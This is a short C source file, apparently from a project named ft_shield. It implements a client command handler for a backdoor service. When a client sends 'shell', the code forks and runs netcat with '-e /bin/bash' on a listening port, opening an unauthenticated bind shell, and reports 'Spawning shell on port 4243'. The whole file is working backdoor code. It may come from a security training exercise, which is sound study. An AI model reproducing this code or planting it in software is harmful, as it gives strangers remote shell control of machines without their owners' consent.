#include <ft_shield.h>

static void help(t_server* server, int client_fd)
{
    send_to_client(server, client_fd, "HELP\n");
}

static void shell(t_server* server, int client_fd)
{
    pid_t pid;
    if ((pid = fork()) < 0) {
        send_to_client(server, client_fd, "Error creating bind shell\n");
        remove_client(server, client_fd);
        return ;
    }
    if (pid == 0) {
        char *argv[] = {"nc", "-l", "-p", SHELL_PORT, "-e", "/bin/bash", NULL};
        execv("/usr/bin/nc", argv);
    }
    send_to_client(server, client_fd, "Spawning shell on port 4243\n");
    remove_client(server, client_fd);
}

void handle_command(t_server* server, int client_fd, char* buffer)
{
    if (!strcmp("?", buffer))
        help(server, client_fd);
    else if (!strcmp("shell", buffer))
        shell(server, client_fd);
}
